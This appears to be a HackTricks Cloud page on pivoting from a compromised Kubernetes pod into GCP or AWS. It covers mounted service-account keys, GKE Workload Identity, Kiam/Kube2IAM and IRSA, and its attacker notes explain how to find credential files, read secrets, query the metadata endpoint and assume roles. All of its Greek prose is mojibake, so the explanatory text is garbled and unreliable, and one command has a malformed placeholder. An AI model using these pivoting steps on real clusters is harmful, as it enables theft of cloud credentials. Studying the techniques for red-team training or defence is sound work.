# Kubernetes Pivoting to Clouds

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## GCP

Î‘Î½ Ï„ÏÎ­Ï‡ÎµÏ„Îµ Î­Î½Î± k8s cluster Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ GCP, Ï€Î¹Î¸Î±Î½ÏŒÏ„Î±Ï„Î± Î¸Î± Î¸Î­Î»ÎµÏ„Îµ ÎºÎ¬Ï€Î¿Î¹Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Ï€Î¿Ï… Ï„ÏÎ­Ï‡ÎµÎ¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ cluster Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ GCP. Î¥Ï€Î¬ÏÏ‡Î¿Ï…Î½ 2 ÎºÎ¿Î¹Î½Î­Ï‚ Î¼Î­Î¸Î¿Î´Î¿Î¹ Î³Î¹Î± Î½Î± Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ Î±Ï…Ï„ÏŒ:

### Mounting GCP-SA keys as secret

ÎœÎ¹Î± ÎºÎ¿Î¹Î½Î® Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î³Î¹Î± Î½Î± Î´ÏÏƒÎµÏ„Îµ **Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¼Î¹Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î® kubernetes ÏƒÏ„Î¿ GCP** ÎµÎ¯Î½Î±Î¹ Î½Î±:

* Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î±Î½ GCP Service Account
* Î”ÎµÏƒÎ¼ÎµÏÏƒÎµÏ„Îµ Ï„Î¹Ï‚ ÎµÏ€Î¹Î¸Ï…Î¼Î·Ï„Î­Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ ÏƒÎµ Î±Ï…Ï„ÏŒÎ½
* ÎšÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Î­Î½Î± json key Ï„Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸Î­Î½Ï„Î¿Ï‚ SA
* Î¤Î¿Ï€Î¿Î¸ÎµÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿ Ï‰Ï‚ Î¼Ï…ÏƒÏ„Î¹ÎºÏŒ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ pod
* ÎŸÏÎ¯ÏƒÎµÏ„Îµ Ï„Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ GOOGLE\_APPLICATION\_CREDENTIALS Ï€Î¿Ï… Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ ÏƒÏ„Î¿ Î¼Î¿Î½Î¿Ï€Î¬Ï„Î¹ ÏŒÏ€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ Ï„Î¿ json.

{% hint style="warning" %}
Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Ï‰Ï‚ **ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚**, Î±Î½ Ï€Î±ÏÎ±Î²Î¹Î¬ÏƒÎµÏ„Îµ Î­Î½Î± ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± pod, Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î³Î¹Î± Î±Ï…Ï„Î® Ï„Î· **Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î®** **env** ÎºÎ±Î¹ **Î±ÏÏ‡ÎµÎ¯Î±** **json** Î¼Îµ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± GCP.
{% endhint %}

### Relating GSA json to KSA secret

ÎœÎ¹Î± Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î³Î¹Î± Î½Î± Î´ÏÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î­Î½Î±Î½ GSA ÏƒÎµ Î­Î½Î± GKE cluster ÎµÎ¯Î½Î±Î¹ Î½Î± Ï„Î¿Ï…Ï‚ Î´ÎµÏƒÎ¼ÎµÏÏƒÎµÏ„Îµ Î¼Îµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï„ÏÏŒÏ€Î¿:

* Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î­Î½Î±Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Kubernetes ÏƒÏ„Î·Î½ Î¯Î´Î¹Î± Ï€ÎµÏÎ¹Î¿Ï‡Î® Î¼Îµ Ï„Î¿ GKE cluster ÏƒÎ±Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ½Ï„Î¿Î»Î®:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î­Î½Î± Kubernetes Secret Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï„Î¿Ï… Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ GCP ÏƒÏ„Î¿Î½ Î¿Ï€Î¿Î¯Î¿ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Ï€Î±ÏÎ±Ï‡Ï‰ÏÎ®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ GKE cluster. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ Î±Ï…Ï„ÏŒ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Î³ÏÎ±Î¼Î¼Î®Ï‚ ÎµÎ½Ï„Î¿Î»ÏÎ½ `gcloud`, ÏŒÏ€Ï‰Ï‚ Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* Î”Î­ÏƒÏ„Îµ Ï„Î¿ Kubernetes Secret ÏƒÏ„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Kubernetes Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ½Ï„Î¿Î»Î®:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
Î£Ï„Î¿ **Î´ÎµÏÏ„ÎµÏÎ¿ Î²Î®Î¼Î±** Î¿ÏÎ¯ÏƒÏ„Î·ÎºÎ±Î½ Ï„Î± **Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï„Î¿Ï… GSA Ï‰Ï‚ Î¼Ï…ÏƒÏ„Î¹ÎºÏŒ Ï„Î¿Ï… KSA**. ÎˆÏ„ÏƒÎ¹, Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Î¼Ï…ÏƒÏ„Î¹ÎºÏŒ** Î±Ï€ÏŒ **Î¼Î­ÏƒÎ±** ÏƒÏ„Î¿ **GKE** cluster, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎºÎ»Î¹Î¼Î±ÎºÏÏƒÎµÏ„Îµ ÏƒÎµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ GCP**.
{% endhint %}

### GKE Workload Identity

ÎœÎµ Ï„Î¿ Workload Identity, Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± ÏÏ…Î¸Î¼Î¯ÏƒÎ¿Ï…Î¼Îµ Î­Î½Î±Î½ [Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Ï‰Ï‚ [Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Google](https://cloud.google.com/iam/docs/understanding-service-accounts). Î¤Î± Pods Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ Î¼Îµ Ï„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Kubernetes Î¸Î± Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± Ï‰Ï‚ Î¿ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Google ÏŒÏ„Î±Î½ Î­Ï‡Î¿Ï…Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Google Cloud APIs.

Î— **Ï€ÏÏÏ„Î· ÏƒÎµÎ¹ÏÎ¬ Î²Î·Î¼Î¬Ï„Ï‰Î½** Î³Î¹Î± Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î±Ï…Ï„Î® Î· ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬ ÎµÎ¯Î½Î±Î¹ Î½Î± **ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ Workload Identity ÏƒÏ„Î¿ GCP** ([**Î²Î®Î¼Î±Ï„Î±**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) ÎºÎ±Î¹ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ GCP SA Ï€Î¿Ï… Î¸Î­Î»ÎµÏ„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Ï„Î¿ k8s.

* **Î•Î½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ Workload Identity** ÏƒÎµ Î­Î½Î± Î½Î­Î¿ cluster

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±/Î•Î½Î·Î¼Î­ÏÏ‰ÏƒÎ· ÎµÎ½ÏŒÏ‚ Î½Î­Î¿Ï… nodepool** (Î¤Î± Autopilot clusters Î´ÎµÎ½ Ï‡ÏÎµÎ¹Î¬Î¶Î¿Î½Ï„Î±Î¹ Î±Ï…Ï„ÏŒ)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Ï„Î¿Î½ **Î›Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Î¥Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ GCP Î³Î¹Î± Ï€ÏÎ¿ÏƒÏ€Î¿Î¯Î·ÏƒÎ·** Î±Ï€ÏŒ Ï„Î¿ K8s Î¼Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± GCP:

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **Î£Ï…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ** Î¼Îµ Ï„Î¿ **cluster** ÎºÎ±Î¹ **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ** Ï„Î¿Î½ **Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚** Î³Î¹Î± Ï‡ÏÎ®ÏƒÎ·

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **Î£ÏÎ½Î´ÎµÏƒÎ· Ï„Î¿Ï… GSA Î¼Îµ Ï„Î¿ KSA**

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* Î•ÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ Î­Î½Î± **pod** Î¼Îµ Ï„Î¿ **KSA** ÎºÎ±Î¹ ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î·Î½ **Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·** ÏƒÏ„Î¿ **GSA:**
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ½Ï„Î¿Î»Î® Î³Î¹Î± Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· ÏƒÎµ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï€Î¿Ï… Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯: 

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
Î©Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ K8s Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± **Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎµÏ„Îµ SAs** Î¼Îµ Ï„Î·Î½ **`iam.gke.io/gcp-service-account` annotation** ÎºÎ±Î¸ÏÏ‚ Î±Ï…Ï„ÏŒ Ï…Ï€Î¿Î´Î·Î»ÏÎ½ÎµÎ¹ ÏŒÏ„Î¹ Î¿ SA Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎºÎ¬Ï„Î¹ ÏƒÏ„Î¿ GCP. ÎœÎ¹Î± Î¬Î»Î»Î· ÎµÏ€Î¹Î»Î¿Î³Î® Î¸Î± Î®Ï„Î±Î½ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ ÎºÎ¬Î¸Îµ KSA ÏƒÏ„Î¿ cluster ÎºÎ±Î¹ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î±Î½ Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·.\
Î‘Ï€ÏŒ Ï„Î¿ GCP ÎµÎ¯Î½Î±Î¹ Ï€Î¬Î½Ï„Î± ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½ Î½Î± Î±Ï€Î±ÏÎ¹Î¸Î¼Î®ÏƒÎµÏ„Îµ Ï„Î¿Ï…Ï‚ Î´ÎµÏƒÎ¼Î¿ÏÏ‚ ÎºÎ±Î¹ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ **Ï€Î¿Î¹Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î´Î¯Î½ÎµÏ„Îµ ÏƒÎµ SAs Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ Kubernetes**.
{% endhint %}

This is a script to easily **iterate over the all the pods** definitions **looking** for that **annotation**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (IAM ÏÏŒÎ»Î¿Ï‚ Î³Î¹Î± Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

ÎœÎ¹Î± (Ï€Î±ÏÏ‰Ï‡Î·Î¼Î­Î½Î·) Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î³Î¹Î± Î½Î± Î´ÏÏƒÎµÏ„Îµ IAM Î¡ÏŒÎ»Î¿Ï…Ï‚ ÏƒÎµ Pods ÎµÎ¯Î½Î±Î¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î­Î½Î±Î½ [**Kiam**](https://github.com/uswitch/kiam) Î® Î­Î½Î±Î½ [**Kube2IAM**](https://github.com/jtblin/kube2iam) **Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®.** Î’Î±ÏƒÎ¹ÎºÎ¬, Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î­Î½Î± **daemonset** ÏƒÏ„Î¿ cluster ÏƒÎ±Ï‚ Î¼Îµ Î­Î½Î±Î½ **Ï„ÏÏ€Î¿ Ï€ÏÎ¿Î½Î¿Î¼Î¹Î±ÎºÎ¿Ï IAM ÏÏŒÎ»Î¿Ï…**. Î‘Ï…Ï„ÏŒ Ï„Î¿ daemonset Î¸Î± ÎµÎ¯Î½Î±Î¹ Î±Ï…Ï„ÏŒ Ï€Î¿Ï… Î¸Î± Î´ÏÏƒÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ IAM ÏÏŒÎ»Î¿Ï…Ï‚ ÏƒÏ„Î± pods Ï€Î¿Ï… Ï„Î¿ Ï‡ÏÎµÎ¹Î¬Î¶Î¿Î½Ï„Î±Î¹.

Î ÏÏÏ„Î± Î±Ï€' ÏŒÎ»Î±, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ„Îµ **Ï€Î¿Î¹Î¿Î¹ ÏÏŒÎ»Î¿Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î±ÏƒÏ„Î¿ÏÎ½ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ namespace**, ÎºÎ±Î¹ Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ Î±Ï…Ï„ÏŒ Î¼Îµ Î¼Î¹Î± Î±Î½Î±Ï†Î¿ÏÎ¬ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ namespace:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

ÎœÏŒÎ»Î¹Ï‚ Ï„Î¿ namespace ÎµÎ¯Î½Î±Î¹ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿ Î¼Îµ Ï„Î¿Ï…Ï‚ ÏÏŒÎ»Î¿Ï…Ï‚ IAM Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î­Ï‡Î¿Ï…Î½ Ï„Î± Pods, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï…Ï€Î¿Î´ÎµÎ¯Î¾ÎµÏ„Îµ Ï„Î¿Î½ ÏÏŒÎ»Î¿ Ï€Î¿Ï… Î¸Î­Î»ÎµÏ„Îµ ÏƒÎµ ÎºÎ¬Î¸Îµ Î¿ÏÎ¹ÏƒÎ¼ÏŒ pod Î¼Îµ ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
Î©Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚, Î±Î½ **Î²ÏÎµÎ¯Ï„Îµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î±Î½Î±Ï†Î¿ÏÎ­Ï‚** ÏƒÎµ pods Î® namespaces Î® Î­Î½Î±Î½ server kiam/kube2iam Ï€Î¿Ï… Ï„ÏÎ­Ï‡ÎµÎ¹ (Ï€Î¹Î¸Î±Î½ÏÏ‚ ÏƒÏ„Î¿ kube-system) Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï€Î±ÏÎ¹ÏƒÏ„Î¬Î½ÎµÏ„Îµ ÎºÎ¬Î¸Îµ ÏÏŒÎ»Î¿** Ï€Î¿Ï… Î®Î´Î· **Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ pods** ÎºÎ±Î¹ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± (Î±Î½ Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ AWS, ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÏ„Îµ Ï„Î¿Ï…Ï‚ ÏÏŒÎ»Î¿Ï…Ï‚).
{% endhint %}

#### Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Pod Î¼Îµ IAM Î¡ÏŒÎ»Î¿

{% hint style="info" %}
ÎŸ IAM ÏÏŒÎ»Î¿Ï‚ Ï€Î¿Ï… Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï…Ï€Î¿Î´ÎµÎ¹Ï‡Î¸ÎµÎ¯ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯Î½Î±Î¹ ÏƒÏ„Î¿Î½ Î¯Î´Î¹Î¿ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ AWS Î¼Îµ Ï„Î¿Î½ ÏÏŒÎ»Î¿ kiam/kube2iam ÎºÎ±Î¹ Î±Ï…Ï„ÏŒÏ‚ Î¿ ÏÏŒÎ»Î¿Ï‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±Ï…Ï„ÏŒÎ½.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM Role for K8s Service Accounts via OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Î‘Ï…Ï„Î® ÎµÎ¯Î½Î±Î¹ Î· **ÏƒÏ…Î½Î¹ÏƒÏ„ÏÎ¼ÎµÎ½Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î±Ï€ÏŒ Ï„Î·Î½ AWS**.

1. Î ÏÏÏ„Î± Î±Ï€' ÏŒÎ»Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± [Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î±Î½ Ï€Î¬ÏÎ¿Ï‡Î¿ OIDC Î³Î¹Î± Ï„Î¿ cluster](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Îµ Î­Î½Î±Î½ ÏÏŒÎ»Î¿ IAM Î¼Îµ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Ï€Î¿Ï… Î¸Î± Î±Ï€Î±Î¹Ï„ÎµÎ¯ Î· SA.
